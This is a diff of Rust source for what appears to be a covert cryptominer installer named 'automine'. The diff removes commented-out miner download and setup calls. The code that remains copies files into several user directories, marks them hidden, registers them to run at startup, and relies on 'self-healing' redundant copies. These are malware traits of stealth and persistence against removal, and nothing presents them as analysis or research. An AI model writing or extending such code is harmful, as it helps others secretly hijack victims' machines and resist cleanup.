@@ -1,13 +1,10 @@
 use std::fs;
 use std::path::Path;
 
-// use crate::config::config::MinerConfig; // Moved to module
 use crate::config::constants::get_launcher_script_name;
 use crate::helpers::files::copy_dir_recursive;
 use crate::helpers::paths::{get_all_install_dirs, set_hidden_recursive, get_userprofile};
 use crate::host::process;
-// use crate::modules::miner::stop_mining;
-// use crate::modules::miner::{install as miner_install, status as miner_status};
 use crate::host::registry::{add_to_startup, remove_from_startup};
 
 pub fn install() -> Result<(), Box<dyn std::error::Error>> {
@@ -19,9 +16,6 @@ pub fn install() -> Result<(), Box<dyn std::error::Error>> {
     fs::create_dir_all(&staging_dir)?;
 
     // 1. Prepare Initial Staging Area (Temp)
-    // Delegate mining setup to Miner Module
-    // This handles Download, Extract, Rename, Config
-    // miner_install::prepare_miner(&staging_dir)?;
 
     // 2. Distribute to ALL locations (AppData, LocalAppData, Temp)
     let install_dirs = get_all_install_dirs();
@@ -132,10 +126,7 @@ pub fn start() -> Result<(), Box<dyn std::error::Error>> {
     }
 
     if !started {
-        // Self-Healing Trigger?
-        // If NO location exists, we might be broken.
-        // But if at least ONE exists, it should have started and ostensibly healed the others.
-        // If the user runs 'automine start', we assume they might be running the installer again or just the CLI.
+        // No valid installation found
         println!("No valid installation found to start.");
     }
     
